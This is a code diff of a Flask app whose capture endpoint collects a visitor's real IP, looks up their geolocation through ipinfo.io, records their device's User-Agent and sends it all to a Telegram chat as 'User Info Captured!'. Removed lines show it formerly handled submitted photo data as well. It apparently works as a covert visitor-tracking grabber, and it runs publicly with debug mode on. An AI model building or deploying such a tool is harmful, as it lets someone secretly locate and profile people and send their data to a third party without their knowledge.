@@ -21,26 +21,25 @@ def index():
 def capture():
     data = request.json
     
-    # Get real IP address from request headers
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
-    # Fetch geolocation based on real IP
+    # Extract real IP address
+    forwarded_ips = request.headers.get("X-Forwarded-For", "")
+    user_ip = forwarded_ips.split(",")[0].strip() if forwarded_ips else request.remote_addr
+
+    # Fetch geolocation based on the real IP
     ip_data = requests.get(f"https://ipinfo.io/{user_ip}/json").json()
     
     # Get other details
-    photo_data = data.get("photo")
-    user_agent = request.headers.get('User-Agent')
+    user_agent = request.headers.get("User-Agent", "Unknown Device")
 
     # Prepare message
-    message = f"🌐 **User Info Captured!**\n\n"
-    message += f"🆔 IP: {ip_data.get('ip', 'N/A')}\n"
-    message += f"📍 Location: {ip_data.get('city', 'Unknown')}, {ip_data.get('region', 'Unknown')}, {ip_data.get('country', 'Unknown')}\n"
-    message += f"📱 Device: {user_agent}\n"
+    message = f"\U0001F310 **User Info Captured!**\n\n"
+    message += f"\U0001F194 IP: {ip_data.get('ip', 'N/A')}\n"
+    message += f"\U0001F4CD Location: {ip_data.get('city', 'Unknown')}, {ip_data.get('region', 'Unknown')}, {ip_data.get('country', 'Unknown')}\n"
+    message += f"\U0001F4F1 Device: {user_agent}\n"
 
     bot.send_message(CHAT_ID, message)
     
     return jsonify({"message": "Data sent to Telegram"})
-
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
